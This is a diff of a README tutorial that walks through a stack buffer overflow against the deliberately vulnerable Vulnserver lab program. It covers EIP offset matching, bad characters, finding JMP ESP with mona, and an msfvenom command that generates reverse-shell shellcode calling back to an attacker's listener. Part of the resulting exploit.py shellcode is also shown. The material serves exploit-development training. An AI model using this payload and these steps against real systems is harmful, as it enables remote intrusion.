@@ -201,13 +201,13 @@ except:
 ```
 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
 ```
-This should return 2003 bytes
+>This should return 2003 bytes
    
 ![offset_match_2003](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/offset_match.png)
    
 ## IV. Overwritting the EIP
 
-1. Now we know that the Offset is in 2003 bytes, we know where to overwrite the EIP with our own payload. \
+1. Now we know that the Offset is in **2003** bytes, we know where to overwrite the EIP with our own payload. \
    Create a python script named ‘overwrite_eip.py’ and add +x to its permission
 
 >overwrite_eip.py
@@ -232,8 +232,10 @@ except:
 ````
 
 >**Q: What is this code do?** \
->A: It sends 2003 **A**s to the **EAX** and **EBP** then 4 **B**s to the **EIP**. We do this to check exactly if we successfully overwrite the **EIP**. \
-    The result should be like this. Check the **EIP** value, its **42424242** the hex value for 4 **B**s.
+>A: It sends 2003 **A**s to the **EAX** and **EBP** then 4 **B**s to the **EIP**. We do this to check exactly if we successfully overwrite the **EIP**.
+    
+    
+>The result should be like this. Check the **EIP** value, its **42424242** the hex value for 4 **B**s.
     
 ![registers_eip_42424242](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_42424242.png)
 
@@ -284,16 +286,16 @@ except:
 ````
 
 >**Q: What does this code do?** \
->A: These bad chars are hex value from 01 to FF and we append this to our shell code. \
+>A: These bad chars are hex value from **01 to FF** and we append this to our shell code. \
     We don't want to include bad characters in our shell code because it will cause trouble and it will cause our shell code not to work.
     
 3. Re-run **IMD** and **vulnserver**, attach and run then run this python script.
 
 4. On **IMD registers**, right click on the **ESP** value (00FEF9C8 for example) > click **Follow in Dump**.
 
-5. On the **Address/Hex dump** section. Find the hex value that is not in the correct order (01 to FF).
+5. On the **Address/Hex dump** section. Find the hex value that is not in the correct order (**01 to FF**).
 
->Note that there is no bad characters found in our exercise. However, this is a example of bad characters.
+>Note that there is no bad character found in our exercise. However, this is an example of bad characters.
 
 ![address_hexdump_sample](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/address_hexdump_sample.png)
 
@@ -303,11 +305,11 @@ except:
 
 2. Paste it in **"C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands"**
 
-3. In immunity debugger after attaching vulnserver.exe, type "!mona modules" in bottom text box 
+3. In immunity debugger after attaching vulnserver.exe, type "**!mona modules**" in bottom text box 
 
 ![mona_modules](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/mona_modules.png)
 
-4. We should find file or DLL that has no protection (Rebase, SafeSH, ASLR etc.) In this case we can use ***essfunc.dll*** (Remember this file)
+4. We should find file or DLL that has no protection (**Rebase, SafeSH, ASLR etc.**) In this case we can use ***essfunc.dll*** (Remember this file)
 
 5. Now we should find the **Operation code (OP)** equivalent for **JMP ESP (Jump to Stack Pointer)**
     
@@ -321,15 +323,17 @@ $ locate nasm_shell
 
 8. In the nasm_shell, type **JMP ESP**. We see that the equivalent hex value of **JMP ESP** is **FFE4**
 
-![jmp_esp](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/jmp_esp.png)
+   ![jmp_esp](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/jmp_esp.png)
 
 9. In IMD bottom textbox, type **!mona find -s "\xff\xe4" -m essfunc.dll** \
-   We can see that the memory address is **625011AF**. We will use this later, this is very important.
+ 
+>We can see that the memory address is **625011AF**. We will use this later, this is very important.
 
 ![mona_find](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/mona_find.png)
 
-10. Save the memory address and use this backwards for the python script (little endian format) \
-    Create python script named ‘**right_module.py**’
+10. Save the memory address and use this backwards for the python script (little endian format) then create python script named ‘**right_module.py**’
+
+>right_module.py
     
 ````python
 #!/usr/bin/python
@@ -348,11 +352,11 @@ except:
 	sys.exit()
 ````
 
->Q: What does this code do? \
+>**Q: What does this code do?** \
 >A: We replace the 4 Bs (EIP area) with the reversed memory address of essfunc.dll that have no protection.
 
 
->Q: Why the memory address is written backwards?\
+>**Q: Why the memory address is written backwards?** \
 >A: In x86 architecture stpres the lower order byte at the lowest memory address and higher byte in highest address. So, we have to put it in reverse order.
 
 11. In IMD, find memory address by clicking this black forward icon ![find_mem_address](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/find_mem_address.png) on the top menu, enter the memory addres (jump code). Click **OK**.
@@ -364,15 +368,18 @@ except:
 
 ![set_breakpoint](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/set_breakpoint.png)
 
-13. In Kali, run the **./right_module.py**. Check the **IMD** and this must be the result. \
-    We overwritten the **EIP** and the **IMD** status is now Paused ![paused](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/paused.png)
+13. In Kali, run the **./right_module.py**. Check the **IMD** and this must be the result. We overwritten the **EIP** and the **IMD** status is now Paused ![paused](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/paused.png)
 
 ![registers_eip_625011af](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/registers_eip_625011af.png)
 
-## V. Generating Shellcode ane gaining root privilege!
+## V. Generating Shellcode and gaining root privilege!
 
-1. Now that we successfully got control the **EIP**, it's time to generate our malicious code to gain reverse shell. \  
-   On Kali, type enter this command in your terminal. 
+1. Now that we successfully got control the **EIP**, it's time to generate our malicious code to gain reverse shell. On Kali, enter this command in your terminal. 
+
+
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.138 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
         
 >**LHOST** = Your Kali's IP address \
 >**PORT** = Your listening port for reverse shell \
@@ -382,16 +389,16 @@ except:
 >**a** = architecture \
 >**b** = bad characters. This is where you put them in. It will be excluded in the generated shell code.
 
-```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.138 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-```
-
 2. Copy and paste the generated string value and use it in our python script. Name it ‘**exploit.py**’
 
 >exploit.py
 
 ````python
-\xca\xba\x78\x3d\xf7\x86\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+#!/usr/bin/python
+import sys, socket 
+
+overflow = (
+"\xda\xca\xba\x78\x3d\xf7\x86\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
 "\x52\x83\xee\xfc\x31\x56\x13\x03\x2e\x2e\x15\x73\x32\xb8\x5b"
 "\x7c\xca\x39\x3c\xf4\x2f\x08\x7c\x62\x24\x3b\x4c\xe0\x68\xb0"
 "\x27\xa4\x98\x43\x45\x61\xaf\xe4\xe0\x57\x9e\xf5\x59\xab\x81"
@@ -444,7 +451,7 @@ except:
 
 5. Open new terminal and run **./exploit.py**
 
-![root](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/root.png)
+   ![root](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/root.png)
 
 # Congratulations! You popped a shell and gained root access !!!
 
